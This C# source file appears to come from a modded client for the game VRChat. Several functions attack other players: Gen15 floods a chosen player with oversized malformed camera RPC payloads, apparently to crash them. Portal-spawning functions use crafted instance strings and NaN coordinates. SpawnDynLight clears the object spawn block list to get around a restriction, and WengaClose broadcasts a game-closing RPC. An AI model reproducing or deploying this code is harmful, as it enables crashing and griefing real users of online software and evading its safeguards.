using System;
using System.Text;
using System.Collections.Generic;
using UnityEngine;
using BlazeIL;
using VRC.SDKBase;
using VRC.Core;
using VRC.UI;

namespace Addons
{
    public static class UserUtils
    {
        public static void Gen15(PhotonPlayer player)
        {
            byte[] array = new byte[17000];
            array[0] = 11;
            array[1] = byte.MaxValue;
            array[2] = 3;
            array[3] = 104;
            for (int i = 4; i < 17000; i++)
            {
                array[i] = 0;
            }
            for (int j = 0; j < 36; j++)
            {
                VRC_EventHandler.VrcEvent vrcEvent = new VRC_EventHandler.VrcEvent
                {
                    EventType = VRC_EventHandler.VrcEventType.SendRPC,
                    ParameterObject = null,
                    ParameterString = "SetCameraRPC",
                    ParameterBytes = array,
                    ParameterBytesVersion = new int?(1),
                    ParameterInt = 9
                };
                VRC_EventLog.VrcEvent vrcEvent2 = new VRC_EventLog.VrcEvent
                {
                    // vrcEvent = vrcEvent,
                    vrcBroadcastType = VRC_EventHandler.VrcBroadcastType.Always,
                    vrcInt = VRC.Player.Instance.photonPlayer.ID,
                    vrcLong = 0L,
                    vrcFloat = 0F,
                };
                Photon.Pun.PhotonView.Find(1).RpcSecure("ProcessEvent", player, true, new IntPtr[] {
                    vrcEvent2.ptr
                });
            }
        }
        #region TeleportTo
        public static void TeleportTo(VRC.Player player) => TeleportTo(player.transform);
        public static void TeleportTo(GameObject gameObject) => TeleportTo(gameObject.transform);
        public static void TeleportTo(Transform transform) => TeleportTo(transform.position);
        public static void TeleportTo(Vector3 position) => VRC.Player.Instance.transform.position = position;
        #endregion

        #region SpawnPortal
        public static GameObject SpawnPortal(Transform transform, string worldId = "wrld_a61806c2-4f5c-4c00-8aae-c5f6d5c3bfde", string instanceId = "Banned Instance\nTupper\0")
        {
            GameObject gameObject = VRC.Network.Instantiate(VRC_EventHandler.VrcBroadcastType.Always, "Portals/PortalInternalDynamic", transform.position + (transform.forward * 2), new Quaternion(0,0,0,0));
            if (gameObject == null)
                return null;

            VRC.Network.RPC(VRC_EventHandler.VrcTargetType.AllBufferOne, gameObject, "ConfigurePortal", new IntPtr[]
            {
                IL2Import.il2cpp_string_new_len(worldId, worldId.Length),
                IL2Import.il2cpp_string_new_len(instanceId, instanceId.Length),
                IL2Import.CreateNewObject(0, BlazeTools.IL2SystemClass.Int32)
            });
            gameObject.GetComponent<PortalInternal>().enabled = false;

            return gameObject;
        }
        #endregion CreatePortal

        public static GameObject SpawnDynLight(Transform transform)
        {
            string[] arrayString = ObjectInstantiator.spawnBlockedList;
            ObjectInstantiator.spawnBlockedList = new string[0];
            GameObject gameObject = VRC.Network.Instantiate(VRC_EventHandler.VrcBroadcastType.Local, "DevProp_DynLight", transform.position + (transform.forward * 2), new Quaternion(0, 0, 0, 0));
            ObjectInstantiator.spawnBlockedList = arrayString;
            return gameObject;
        }

        public static void WengaClose()
        {
            SendForWenga("CloseGameRPC", "ALL", "=T_T= You friend Blaze :c");
        }

        public static void SendForWenga(string Method, string UserID, string ExtraInfo)
        {
            try
            {
                string text = string.Concat(new string[]
                {
                    Method,
                    "|",
                    UserID,
                    "|",
                    ExtraInfo
                });
                text = Convert.ToBase64String(Encoding.ASCII.GetBytes(text));
                VRC.Network.RPC(VRC_EventHandler.VrcTargetType.Others, VRCPlayer.Instance.gameObject, "DayClient", new IntPtr[]
                {
                    IL2Import.il2cpp_string_new_len(text, text.Length),
                });
            }
            catch (Exception)
            {
            }
        }
        public static void RemoveInstiatorObjects()
        {
            foreach(var obj in UnityEngine.Object.FindObjectsOfType<ObjectInstantiatorHandle>())
                obj.gameObject.Destroy();
            RoomManager.portalInternalList.Clear();
        }

        public static GameObject GlobalDisableColliders(Transform transform, string worldId = "wrld_a61806c2-4f5c-4c00-8aae-c5f6d5c3bfde", string instanceId = "Banned Instance\nTupper\0")
        {
            GameObject gameObject = VRC.Network.Instantiate(VRC_EventHandler.VrcBroadcastType.Always, "Portals/PortalInternalDynamic", new Vector3(float.NaN, float.NaN, float.NaN), new Quaternion(float.NaN, float.NaN, float.NaN, float.NaN)); ;
            if (gameObject == null)
                return null;

            VRC.Network.RPC(VRC_EventHandler.VrcTargetType.AllBufferOne, gameObject, "ConfigurePortal", new IntPtr[]
            {
                IL2Import.il2cpp_string_new_len(worldId, worldId.Length),
                IL2Import.il2cpp_string_new_len(instanceId, instanceId.Length),
                IL2Import.CreateNewObject(0, BlazeTools.IL2SystemClass.Int32)
            });
            gameObject.GetComponent<PortalInternal>().enabled = false;

            return gameObject;
        }

        internal static APIUser current_User_UserInfo
        {
            get
            {
                // return GameObject.Find("UserInterface/MenuContent/Screens/UserInfo")?.GetComponent<VRCUiPage>()?.user;
                return GameObject.Find("UserInterface/MenuContent/Screens/UserInfo")?.GetComponent<PageUserInfo>()?.user;
            }
        }

        public static string[] kos_list
        {
            get
            {
                if (array_kos_list == null)
                {
                    BlazeWebAPI.WebRequest kos = new BlazeWebAPI.WebRequest("bz_kos");
                    kos.customWeb = new WebTools.CustomWeb();
                    string response = kos.customWeb._Get(BlazeWebAPI.API.standart_url + "bz_kos");
                    foreach(var str in response.Split('\n'))
                    {
                        if (str.Length < 40)
                            continue;

                        array_kos_list = str.Split('|');
                    }
                }
                return array_kos_list;
            }
        }

        public static string[] blockedAvatars
        {
            get
            {
                if (avatarsBlocked == null)
                {
                    avatarsBlocked = new List<string>();
                    BlazeWebAPI.WebRequest kos = new BlazeWebAPI.WebRequest("bz_avtr");
                    kos.customWeb = new WebTools.CustomWeb();
                    string response = kos.customWeb._Get(BlazeWebAPI.API.standart_url + "bz_avtr");
                    foreach (var str in response.Split('\n'))
                    {
                        string avtr = str?.Trim();
                        if (string.IsNullOrWhiteSpace(avtr))
                            continue;

                        avatarsBlocked.Add(avtr);
                    }
                }
                return avatarsBlocked?.ToArray();
            }
        }

        private static List<string> avatarsBlocked = null;

        public static List<string> Menu_AvatarsList = new List<string>();

        public static string prefix = (char)9999 + "_";

        private static string[] array_kos_list = null;
    }
}
